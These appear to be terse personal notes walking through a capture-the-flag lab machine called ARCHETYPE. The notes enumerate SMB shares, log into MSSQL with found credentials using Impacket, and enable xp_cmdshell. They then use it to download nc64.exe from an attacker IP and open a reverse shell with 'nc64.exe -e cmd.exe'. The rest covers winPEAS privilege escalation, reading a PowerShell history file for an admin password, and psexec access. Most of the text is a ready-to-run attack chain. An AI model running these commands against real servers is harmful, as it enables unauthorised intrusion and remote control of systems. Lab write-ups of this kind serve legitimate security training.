
 SMB enumaration > We get sql Creds > use Impacket tool > sql shell link below > make xp_cmdshell work fixing the error>  use xp_cmdshell command line to download nc64.exe, execute >  priv escalation now, winpeas.exe over to target > we get interesting file with password > psexec.py connect via admin

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet


> Enumarate Smb Shares
```
smbclient -N -L IP
```
```
use auxiliary/scanner/smb/smb_enumshares
```

> Connect to Smb Share 
```
smbclient //IP/smbsharename -N
```
 
 > Impacket command:
 > 
```
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.139.34 -windows-auth 
```

> sysadmin account from enumartion
SELECT is_srvrolemember('sysadmin');

> xp_cmdshell executable:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```
xp_cmdshell "whoami"
```


```
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; Invoke-WebRequest -Uri http://10.10.15.73/nc64.exe -OutFile nc64.exe"';
```

Execute .exe payload:
```
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.73 443"';
```


>file from winpeas:
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

